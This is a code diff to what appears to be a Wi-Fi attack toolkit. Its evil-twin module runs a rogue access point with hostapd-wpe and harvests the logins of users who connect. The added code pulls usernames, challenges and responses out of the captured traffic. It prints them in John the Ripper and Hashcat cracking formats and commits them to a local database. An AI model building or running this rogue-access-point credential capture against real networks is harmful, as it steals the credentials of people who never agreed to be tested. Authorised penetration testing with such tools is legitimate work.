@@ -11,6 +11,18 @@ try:
 except Exception as e:
 	print('\n [!] Error ' +str(e))
 
+
+try:
+	from dbcommands import DB
+	import sqlite3
+	conn = sqlite3.connect('data/WiFiSuite.db', check_same_thread=False) # KEEP Thread Support
+	conn.text_factory = str # KEEP Interpret 8-bit bytestrings 
+	conn.isolation_level = None # KEEP Autocommit Mode
+	db = DB(conn)
+except Exception as e:
+	print(red('!') + 'Could not connect to database: ' +str(e))
+	sys.exit(1)	
+
 class evilTwin(threading.Thread):
 	def __init__(self, interface, ssid, channel, macaddress, \
 	 certname, band, server_cert, private_key,\
@@ -41,18 +53,31 @@ class evilTwin(threading.Thread):
 		self.sanity_check()
 		time.sleep(1.5)
 		p1 = Popen(['hostapd-wpe', 'data/hostapd-wpe/hostapd-wpe.conf'], stdout=PIPE)
-		print('\n[i] Real-time hostapd-wpe logs below:\n')
+		print('\n [i] Real-time logs below:\n')
 		counter = 0
 		if counter <= 5:
 			for line in iter(p1.stdout.readline, ''):
 				counter+=1
-				sys.stdout.write(line)
 				# f.write(line)
+				if "username" in line:
+					user = line.split()[1]
+					# sys.stdout.write(line)
+				elif 'challenge' in line: 
+					challenge = line.split()[1]
+				elif 'response' in line:
+					response = line.split()[1]
+				elif 'jtr' in line:
+					jtr = line.split()[2]
+					print('Identity: %s' % (user))
+					print('John: %s' % (jtr))
+					print('Hashcat: %s::::%s:%s' % (user, response.translate(None, ':'), challenge.translate(None, ':')))
+					# Commit to database
 		
 		# Obtain hostapd-wpe Process ID
 		global eviltwin_pid
 		eviltwin_pid=p1.pid
 		raw_input(red('!') + 'Press Enter to quit\n\n')
+		self.captured_creds()
 		# Send the signal terminate HTTPS Serverprocess
 		os.kill(os.getpgid(eviltwin_pid), signal.SIGTERM)
 		# self.driver_fix()
@@ -118,7 +143,7 @@ class evilTwin(threading.Thread):
 		data[15]= 'channel=%s\n' % (self.channel)
 		data[8] = 'server_cert=%s\n' % (self.server_cert)
 		data[9] = 'private_key=%s\n' % (self.private_key)
-		data[19] = 'wpe_logfile=data/eviltwin/%s_eviltwin.log\n' % (self.ssid)
+		data[19] = 'wpe_logfile=data/eviltwin/%s.log\n' % (self.ssid)
 		data[183] = 'hw_mode=%s\n' % (self.band.lower())
 
 
@@ -128,7 +153,7 @@ class evilTwin(threading.Thread):
 		print('     Band: %s' % (self.band))
 		print('     Channel: %s' % (self.channel))
 		print('     Certificate Name: %s' % (self.certname))
-		print('     Creds saved to: data/eviltwin/%s_eviltwin.log' % (self.ssid))
+		print('     Log saved to: data/eviltwin/%s.log' % (self.ssid))
 		# print('     Server Cert Path: %s' % (self.server_cert))
 		# print('     Private Key Path: %s' % (self.private_key))
 		# Design Reference: 
@@ -167,6 +192,23 @@ class evilTwin(threading.Thread):
 		# for line in iter(p1.stdout.readline, ''):
 		#     sys.stdout.write(line)
 		# print(green('*') + 'TLS/SSL Certificate Successfully Created')
+	
+	def captured_creds(self):
+		ntlm_hash = ''
+		log = 'data/eviltwin/%s.log' % (self.ssid)
+		with open(log) as f1:
+			f1.readline()
+			for line in f1:
+				if "username" in line:
+					user = line.split()[1]
+				elif 'challenge' in line: 
+					challenge = line.split()[1]
+				elif 'response' in line:
+					response = line.split()[1]
+					print('%s, %s, %s' % (user, challenge, response))
+					# Commit to database
+					db.eviltwin_commit(self.ssid, user, ntlm_hash)
+
 
 	def grab_internal_ip(self):
 		print('Place holder')
